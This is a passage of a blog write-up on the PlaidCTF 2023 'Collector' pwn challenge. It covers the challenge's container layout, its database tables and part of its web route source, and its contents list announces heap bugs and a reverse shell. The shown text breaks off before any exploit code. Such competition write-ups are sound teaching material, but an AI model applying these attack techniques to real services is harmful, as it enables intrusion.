<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Plaid CTF 2023 - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png">
  <meta name="twitter:title" content="Plaid CTF 2023">
  <meta name="twitter:description" content="Writeup for Pwn challenges in PlaidCTF 2023">
      <meta name="twitter:site" content="@Chovid99">
<meta property="og:url" content="https://chovid99.github.io/posts/plaidctf-2023/">
  <meta property="og:site_name" content="Chovid99&#39;s Blog">
  <meta property="og:title" content="Plaid CTF 2023">
  <meta property="og:description" content="Writeup for Pwn challenges in PlaidCTF 2023">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2023-04-17T04:00:36+07:00">
    <meta property="article:modified_time" content="2023-04-19T12:10:09+07:00">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="PlaidCTF">
    <meta property="article:tag" content="Pwn">
    <meta property="article:tag" content="Web">
    <meta property="article:tag" content="Heap">
    <meta property="article:tag" content="Postgresql">
    <meta property="og:image" content="https://chovid99.github.io/C99-web-card.png">
<meta name="application-name" content="Chovid99&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/plaidctf-2023/" /><link rel="prev" href="https://chovid99.github.io/posts/line-ctf-2023/" /><link rel="next" href="https://chovid99.github.io/posts/tamuctf-2023/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="9bWYU2tJlhINPHANaxcXkK63aSnxvqj7GHrr_r5tb9s" /><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Plaid CTF 2023",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/chovid99.github.io\/posts\/plaidctf-2023\/"
        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, PlaidCTF, pwn, web, heap, postgresql, collation","wordcount":  7989 ,
        "url": "https:\/\/chovid99.github.io\/posts\/plaidctf-2023\/","datePublished": "2023-04-17T04:00:36+07:00","dateModified": "2023-04-19T12:10:09+07:00","publisher": {
            "@type": "Organization",
            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
                "@type": "Person",
                "name": "Author"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                
                
            </a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Plaid CTF 2023</h1><div class="post-meta">
            <div class="post-meta-line">
                </div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Apr 17, 2023">Apr 17, 2023</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;7989 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;38 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#pwn">Pwn</a>
      <ul>
        <li><a href="#collector">Collector</a>
          <ul>
            <li><a href="#initial-analysis">Initial Analysis</a>
              <ul>
                <li><a href="#null-terminator-bug">Null-terminator bug</a></li>
                <li><a href="#double-fetch-bug">Double-fetch bug</a></li>
              </ul>
            </li>
            <li><a href="#solution">Solution</a>
              <ul>
                <li><a href="#obtaining-useful-leak-values">Obtaining useful leak values</a></li>
                <li><a href="#triggering-double-fetch-bug">Triggering double-fetch bug</a></li>
                <li><a href="#obtaining-a-reverse-shell-through-oob-write">Obtaining a Reverse Shell through OOB Write</a></li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#social-media">Social Media</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><figure><a class="lightgallery" href="https://i.imgur.com/KDgTifd.jpg" title="https://i.imgur.com/KDgTifd.jpg" data-thumbnail="https://i.imgur.com/KDgTifd.jpg" data-sub-html="<h2>Plaid CTF 2023</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="https://i.imgur.com/KDgTifd.jpg"
            data-srcset="https://i.imgur.com/KDgTifd.jpg, https://i.imgur.com/KDgTifd.jpg 1.5x, https://i.imgur.com/KDgTifd.jpg 2x"
            data-sizes="auto"
            alt="https://i.imgur.com/KDgTifd.jpg" />
    </a><figcaption class="image-caption">Plaid CTF 2023</figcaption>
    </figure>
<p>Last weekend, I played with the <strong>Blue Water</strong> team in the Plaid CTF 2023. We had the honor of not only competing but also securing <strong>first place</strong> in this prestigious event. It was an intense and exciting competition, and we all put our skills to the test. A huge shoutout and thanks to my awesome teammates for their fantastic teamwork during the Plaid CTF 2023!</p>
<figure><a class="lightgallery" href="https://i.imgur.com/AuYDr66.png" title="https://i.imgur.com/AuYDr66.png" data-thumbnail="https://i.imgur.com/AuYDr66.png" data-sub-html="<h2>We secured the first place</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="https://i.imgur.com/AuYDr66.png"
            data-srcset="https://i.imgur.com/AuYDr66.png, https://i.imgur.com/AuYDr66.png 1.5x, https://i.imgur.com/AuYDr66.png 2x"
            data-sizes="auto"
            alt="https://i.imgur.com/AuYDr66.png" />
    </a><figcaption class="image-caption">We secured the first place</figcaption>
    </figure>
<p>One of the pwn challenges that we were able to tackle was called &ldquo;Collector.&rdquo; Remarkably, we were the team that first blooded this particular challenge, and we remained the only team to successfully solve it. In this blog post, I&rsquo;ll be walking you through our approach to this challenge and how we managed to crack it.</p>
<figure><a class="lightgallery" href="https://i.imgur.com/MsI4S8g.png" title="https://i.imgur.com/MsI4S8g.png" data-thumbnail="https://i.imgur.com/MsI4S8g.png" data-sub-html="<h2>We first blooded the challenge and remained the only team to successfully solve it</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="https://i.imgur.com/MsI4S8g.png"
            data-srcset="https://i.imgur.com/MsI4S8g.png, https://i.imgur.com/MsI4S8g.png 1.5x, https://i.imgur.com/MsI4S8g.png 2x"
            data-sizes="auto"
            alt="https://i.imgur.com/MsI4S8g.png" />
    </a><figcaption class="image-caption">We first blooded the challenge and remained the only team to successfully solve it</figcaption>
    </figure>
<h1 id="pwn">Pwn</h1>
<h2 id="collector">Collector</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">Shiver me timbers! We shan&rsquo;t be running you a rig here. The scuttlebut be that the greatest booty in all the land be ready and waiting to barter. Bring yer coin ye scurvy dog and make off with enough gear to make yer husband, yer kids, and yer parrot into right swashbucklers.</div>
        </div>
    </div>
<h3 id="initial-analysis">Initial Analysis</h3>
<p>For this challenge, we were provided with a <code>.tgz</code> file containing the docker and challenge sources. In summary, the challenge consisted of four containers that needed to be spawned:</p>
<ul>
<li><code>web</code></li>
<li><code>webhook</code></li>
<li><code>maindb</code></li>
<li><code>workerdb</code></li>
</ul>
<p>Each container had its own responsibilities, but to summarize:</p>
<ul>
<li><code>maindb</code> is the master db that is used by the container <code>web</code>.</li>
<li><code>workerdb</code> is the replica db that is used by the container <code>webhook</code>.
<ul>
<li>The WAL replication that is used is <code>replica</code> or <code>streaming</code> replication (based on the postgresql <code>maindb</code> config in the given file).</li>
</ul>
</li>
<li><code>web</code> is the main container that we interacted with (the website interface + the API)</li>
<li><code>webhook</code> is a container that will be used by the <code>web</code> to handle one of the API call that we can use (we will discuss this later).</li>
</ul>
<p>After reviewing the <code>maindb</code> schema, we found that a total of seven tables had been created:</p>
<ul>
<li><code>hooks</code></li>
<li><code>items</code></li>
<li><code>market</code></li>
<li><code>initial_inventory</code></li>
<li><code>inventory</code></li>
<li><code>users</code></li>
<li><code>flag</code></li>
</ul>
<p>As it turned out, our flag was stored within the <code>flag</code> table, which meant that our ultimate objective was to find a way to interact with the table and extract its contents.</p>
<p>Our next step was to inspect the <code>web</code> container, starting with a review of the <code>routes/index.tsx</code>source code. This file contained the primary API logic that we needed to interact with.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span><span class="lnt">272
</span><span class="lnt">273
</span><span class="lnt">274
</span><span class="lnt">275
</span><span class="lnt">276
</span><span class="lnt">277
</span><span class="lnt">278
</span><span class="lnt">279
</span><span class="lnt">280
</span><span class="lnt">281
</span><span class="lnt">282
</span><span class="lnt">283
</span><span class="lnt">284
</span><span class="lnt">285
</span><span class="lnt">286
</span><span class="lnt">287
</span><span class="lnt">288
</span><span class="lnt">289
</span><span class="lnt">290
</span><span class="lnt">291
</span><span class="lnt">292
</span><span class="lnt">293
</span><span class="lnt">294
</span><span class="lnt">295
</span><span class="lnt">296
</span><span class="lnt">297
</span><span class="lnt">298
</span><span class="lnt">299
</span><span class="lnt">300
</span><span class="lnt">301
</span><span class="lnt">302
</span><span class="lnt">303
</span><span class="lnt">304
</span><span class="lnt">305
</span><span class="lnt">306
</span><span class="lnt">307
</span><span class="lnt">308
</span><span class="lnt">309
</span><span class="lnt">310
</span><span class="lnt">311
</span><span class="lnt">312
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">import</span> <span class="p">{</span> <span class="nx">create</span> <span class="p">}</span> <span class="nx">from</span> <span class="s2">&#34;domain&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="p">{</span> <span class="nx">createEffect</span><span class="p">,</span> <span class="nx">createRenderEffect</span><span class="p">,</span> <span class="nx">createSignal</span><span class="p">,</span> <span class="nx">For</span><span class="p">,</span> <span class="nx">onCleanup</span><span class="p">,</span> <span class="nx">Show</span> <span class="p">}</span> <span class="nx">from</span> <span class="s2">&#34;solid-js&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="p">{</span> <span class="nx">FormError</span><span class="p">,</span> <span class="nx">useRouteData</span> <span class="p">}</span> <span class="nx">from</span> <span class="s2">&#34;solid-start&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">createServerAction$</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">createServerData$</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">redirect</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="nx">from</span> <span class="s2">&#34;solid-start/server&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">sql</span> <span class="nx">from</span> <span class="s2">&#34;~/db&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="p">{</span> <span class="nx">getUser</span><span class="p">,</span> <span class="nx">getUserSession</span><span class="p">,</span> <span class="nx">logout</span><span class="p">,</span> <span class="nx">requireUserId</span> <span class="p">}</span> <span class="nx">from</span> <span class="s2">&#34;~/db/session&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="o">*</span> <span class="nx">as</span> <span class="nx">fs</span> <span class="nx">from</span> <span class="s1">&#39;node:fs/promises&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="p">{</span> <span class="nx">requestHook</span> <span class="p">}</span> <span class="nx">from</span> <span class="s2">&#34;~/db/hook&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="p">{</span> <span class="nx">Form</span> <span class="p">}</span> <span class="nx">from</span> <span class="s2">&#34;solid-start/data/Form&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">toast</span> <span class="nx">from</span> <span class="s2">&#34;solid-toast&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">COIN_ID</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">type</span> <span class="nx">MarketItem</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">id</span><span class="o">:</span> <span class="nx">string</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="nx">string</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">kind</span><span class="o">:</span> <span class="nx">string</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">bid_price</span><span class="o">:</span> <span class="nx">number</span> <span class="o">|</span> <span class="kc">null</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">ask_price</span><span class="o">:</span> <span class="nx">number</span> <span class="o">|</span> <span class="kc">null</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">bid_size</span><span class="o">:</span> <span class="nx">number</span> <span class="o">|</span> <span class="kc">null</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">ask_size</span><span class="o">:</span> <span class="nx">number</span> <span class="o">|</span> <span class="kc">null</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">type</span> <span class="nx">RouteData</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">userId</span><span class="o">:</span> <span class="nx">string</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">market</span><span class="o">:</span> <span class="nx">MarketItem</span><span class="p">[],</span>
</span></span><span class="line"><span class="cl">  <span class="nx">inventory</span><span class="o">:</span> <span class="p">{</span> <span class="p">[</span><span class="nx">item_id</span><span class="o">:</span> <span class="nx">string</span><span class="p">]</span><span class="o">:</span> <span class="nx">number</span> <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">watchedItems</span><span class="o">:</span> <span class="nx">string</span><span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="kd">function</span> <span class="nx">routeData</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">createServerData$</span><span class="o">&lt;</span><span class="nx">RouteData</span><span class="o">&gt;</span><span class="p">(</span><span class="kr">async</span> <span class="p">(</span><span class="nx">_</span><span class="p">,</span> <span class="p">{</span> <span class="nx">request</span> <span class="p">})</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">userId</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">requireUserId</span><span class="p">(</span><span class="nx">request</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">markets</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">sql</span><span class="sb">`
</span></span></span><span class="line"><span class="cl"><span class="sb">      SELECT kind, name, items.id, bid_price, bid_size, ask_price, ask_size FROM items
</span></span></span><span class="line"><span class="cl"><span class="sb">      LEFT JOIN market ON market.item_id = items.id
</span></span></span><span class="line"><span class="cl"><span class="sb">      ORDER BY items.id ASC
</span></span></span><span class="line"><span class="cl"><span class="sb">    `</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">inventory</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">sql</span><span class="sb">`
</span></span></span><span class="line"><span class="cl"><span class="sb">      SELECT item_id, count FROM inventory
</span></span></span><span class="line"><span class="cl"><span class="sb">      WHERE user_id = </span><span class="si">${</span><span class="nx">userId</span><span class="si">}</span><span class="sb">
</span></span></span><span class="line"><span class="cl"><span class="sb">        AND count &gt; 0
</span></span></span><span class="line"><span class="cl"><span class="sb">    `</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">inventoryDict</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">fromEntries</span><span class="p">(</span><span class="nx">inventory</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">x</span> <span class="p">=&gt;</span> <span class="p">[</span><span class="nx">x</span><span class="p">.</span><span class="nx">item_id</span><span class="p">,</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">x</span><span class="p">.</span><span class="nx">count</span><span class="p">)]));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">watching</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">sql</span><span class="sb">`
</span></span></span><span class="line"><span class="cl"><span class="sb">      SELECT DISTINCT kind FROM hooks
</span></span></span><span class="line"><span class="cl"><span class="sb">      WHERE user_id = </span><span class="si">${</span><span class="nx">userId</span><span class="si">}</span><span class="sb">
</span></span></span><span class="line"><span class="cl"><span class="sb">    `</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nx">stringnum</span><span class="p">(</span><span class="nx">x</span><span class="o">:</span> <span class="nx">string</span> <span class="o">|</span> <span class="kc">null</span><span class="p">)</span><span class="o">:</span> <span class="nx">number</span> <span class="o">|</span> <span class="kc">null</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="k">return</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span> <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">marketArray</span> <span class="o">=</span> <span class="nx">markets</span><span class="p">.</span><span class="nx">map</span><span class="p">(({</span> <span class="nx">id</span><span class="p">,</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">kind</span><span class="p">,</span> <span class="nx">bid_price</span><span class="p">,</span> <span class="nx">ask_price</span><span class="p">,</span> <span class="nx">bid_size</span><span class="p">,</span> <span class="nx">ask_size</span> <span class="p">})</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">id</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">kind</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">name</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">bid_price</span><span class="o">:</span> <span class="nx">stringnum</span><span class="p">(</span><span class="nx">bid_price</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nx">bid_size</span><span class="o">:</span> <span class="nx">stringnum</span><span class="p">(</span><span class="nx">bid_size</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nx">ask_price</span><span class="o">:</span> <span class="nx">stringnum</span><span class="p">(</span><span class="nx">ask_price</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="nx">ask_size</span><span class="o">:</span> <span class="nx">stringnum</span><span class="p">(</span><span class="nx">ask_size</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="cl">
